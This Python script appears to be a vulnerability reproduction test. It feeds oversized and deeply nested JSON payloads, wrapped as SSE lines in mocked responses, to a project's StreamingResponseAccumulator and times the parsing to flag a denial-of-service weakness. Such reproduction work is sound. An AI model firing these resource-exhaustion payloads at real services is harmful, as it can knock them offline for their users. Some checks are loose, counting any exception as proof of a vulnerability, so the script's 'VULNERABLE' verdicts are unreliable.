#!/usr/bin/env python3
"""
DoS vulnerability reproduction script for response_accumulator.py

This script demonstrates a DoS vulnerability in the StreamingResponseAccumulator
where json.loads() is called without size limits on SSE data lines.

Vulnerability location:
src/connectors/gemini_base/response_accumulator.py:160
data = json.loads(data_str)

The data_str comes from SSE data lines that can be arbitrarily large,
allowing an attacker to send massive JSON payloads that consume
excessive CPU and memory during parsing.
"""

import sys
import os
import time
import json
from io import StringIO

# Add src to path to import module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from src.connectors.gemini_base.response_accumulator import StreamingResponseAccumulator
from src.core.domain.responses import StreamingResponseEnvelope

def create_malicious_sse_chunk():
    """Create a malicious SSE chunk with large JSON payload."""
    
    # Create a very large JSON object (2MB+)
    large_payload = {
        "choices": [{
            "delta": {
                "content": "A" * (2 * 1024 * 1024),  # 2MB of content
            }
        }],
        "usage": {
            "prompt_tokens": 1000,
            "completion_tokens": 50000,
            "total_tokens": 51000
        },
        # Add massive nested structure to increase parsing complexity
        "large_array": list(range(100000)),  # 100k elements
        "deep_nested": {
            "level1": {
                "level2": {
                    "level3": {
                        # Deep nesting that can cause stack issues
                        "data": [{"nested": i} for i in range(10000)]
                    }
                }
            }
        }
    }
    
    # Convert to JSON and wrap in SSE format
    json_data = json.dumps(large_payload)
    sse_line = f"data: {json_data}\n"
    
    return sse_line.encode('utf-8')

def create_streaming_response_with_malicious_chunk():
    """Create a streaming response containing malicious chunk."""
    
    malicious_chunk = create_malicious_sse_chunk()
    
    # Create a mock streaming response
    class MockChunk:
        def __init__(self, data):
            self.content = data
    
    class MockStreamingResponse:
        def __init__(self, chunks):
            self.content = chunks
            self.headers = {"content-type": "text/plain"}
            self.status_code = 200
    
    return MockStreamingResponse([MockChunk(malicious_chunk)])

async def test_dos_vulnerability():
    """Test DoS vulnerability with malicious SSE chunk."""
    
    print("Testing DoS vulnerability in StreamingResponseAccumulator...")
    print("=" * 60)
    
    accumulator = StreamingResponseAccumulator()
    
    # Test 1: Large JSON payload
    print("\nTest 1: Large JSON payload (2MB+)")
    print("-" * 40)
    
    malicious_response = create_streaming_response_with_malicious_chunk()
    
    print(f"Created malicious SSE chunk size: {len(create_malicious_sse_chunk())} bytes")
    
    start_time = time.time()
    memory_before = get_memory_usage()
    
    try:
        # This should trigger the vulnerability
        result = await accumulator.accumulate(malicious_response)
        end_time = time.time()
        memory_after = get_memory_usage()
        
        print(f"Processing completed in {end_time - start_time:.4f} seconds")
        print(f"Memory usage change: {memory_after - memory_before:.2f} MB")
        
        if end_time - start_time > 2.0:
            print("WARNING: Processing time indicates potential DoS vulnerability!")
            return True
        
        if memory_after - memory_before > 50:  # 50MB increase
            print("WARNING: High memory usage indicates potential DoS vulnerability!")
            return True
            
        print("OK: Processing completed within acceptable limits")
        
    except Exception as e:
        end_time = time.time()
        print(f"ERROR during processing: {e}")
        print(f"Error occurred after {end_time - start_time:.4f} seconds")
        
        # Errors during processing could also indicate DoS potential
        if "Memory" in str(e) or "memory" in str(e):
            print("WARNING: Memory-related error - potential DoS vulnerability!")
            return True
        
        return True  # Any error that could be induced is a vulnerability
    
    return False

def get_memory_usage():
    """Get current memory usage in MB (rough estimate)."""
    try:
        import psutil
        process = psutil.Process(os.getpid())
        return process.memory_info().rss / 1024 / 1024
    except ImportError:
        return 0  # Can't measure memory without psutil

async def test_multiple_payloads():
    """Test multiple malicious payloads to simulate sustained attack."""
    
    print("\nTest 2: Multiple large payloads")
    print("-" * 40)
    
    accumulator = StreamingResponseAccumulator()
    
    # Test with progressively larger payloads
    sizes = [1, 5, 10, 20]  # MB
    
    for size_mb in sizes:
        print(f"\nTesting {size_mb}MB payload...")
        
        # Create payload of specified size
        payload_size = size_mb * 1024 * 1024
        large_content = "X" * payload_size
        
        payload = {
            "choices": [{"delta": {"content": large_content}}],
            "usage": {"total_tokens": payload_size // 4}
        }
        
        json_data = json.dumps(payload)
        sse_line = f"data: {json_data}\n"
        
        class MockChunk:
            def __init__(self, data):
                self.content = data.encode('utf-8')
        
        class MockStreamingResponse:
            def __init__(self, chunk):
                self.content = [chunk]
                self.headers = {}
                self.status_code = 200
        
        response = MockStreamingResponse(MockChunk(sse_line))
        
        start = time.time()
        try:
            result = await accumulator.accumulate(response)
            end = time.time()
            
            print(f"  Processing time: {end - start:.4f}s")
            print(f"  Payload size: {len(sse_line)} bytes")
            
            if end - start > 1.0:
                print(f"  WARNING: {size_mb}MB payload took too long to process!")
                
        except Exception as e:
            end = time.time()
            print(f"  ERROR: {e}")
            print(f"  Failed after {end - start:.4f}s")
            
            if any(keyword in str(e).lower() for keyword in ["memory", "size", "limit"]):
                print(f"  CRITICAL: Resource exhaustion detected!")
                return True
    
    return False

async def test_edge_cases():
    """Test edge cases that might trigger vulnerabilities."""
    
    print("\nTest 3: Edge cases")
    print("-" * 40)
    
    accumulator = StreamingResponseAccumulator()
    
    edge_cases = [
        # Deeply nested JSON
        {
            "a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {"k": "deep"}}}}}}}}}}
        },
        
        # Massive array
        {
            "large_array": list(range(50000))
        },
        
        # Many small objects
        {
            "objects": [{"id": i, "data": f"item_{i}"} for i in range(10000)]
        },
        
        # Wide object with many keys
        {
            f"key_{i}": f"value_{i}" for i in range(1000)
        }
    ]
    
    for i, payload in enumerate(edge_cases, 1):
        print(f"\nEdge case {i}: {type(payload).__name__} structure")
        
        json_data = json.dumps(payload)
        sse_line = f"data: {json_data}\n"
        
        class MockChunk:
            def __init__(self, data):
                self.content = data.encode('utf-8')
        
        class MockStreamingResponse:
            def __init__(self, chunk):
                self.content = [chunk]
                self.headers = {}
                self.status_code = 200
        
        response = MockStreamingResponse(MockChunk(sse_line))
        
        start = time.time()
        try:
            result = await accumulator.accumulate(response)
            end = time.time()
            
            print(f"  Processing time: {end - start:.4f}s")
            print(f"  JSON size: {len(json_data)} bytes")
            
            if end - start > 0.5:
                print(f"  WARNING: Edge case {i} took too long!")
                return True
                
        except Exception as e:
            end = time.time()
            print(f"  ERROR: {e}")
            print(f"  Failed after {end - start:.4f}s")
            return True
    
    return False

async def main():
    """Main test function."""
    print("DoS Vulnerability Test - StreamingResponseAccumulator")
    print("=" * 60)
    
    # Run all tests
    test1_vulnerable = await test_dos_vulnerability()
    test2_vulnerable = await test_multiple_payloads()
    test3_vulnerable = await test_edge_cases()
    
    print("\n" + "=" * 60)
    print("VULNERABILITY ASSESSMENT:")
    print(f"Large payload test: {'VULNERABLE' if test1_vulnerable else 'OK'}")
    print(f"Multiple payload test: {'VULNERABLE' if test2_vulnerable else 'OK'}")
    print(f"Edge case test: {'VULNERABLE' if test3_vulnerable else 'OK'}")
    
    if test1_vulnerable or test2_vulnerable or test3_vulnerable:
        print("\nALERT: DoS VULNERABILITY CONFIRMED!")
        print("The StreamingResponseAccumulator is vulnerable to DoS attacks")
        print("through malicious SSE data with large JSON payloads")
        sys.exit(1)
    else:
        print("\nOK: No significant DoS vulnerabilities detected")
        sys.exit(0)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())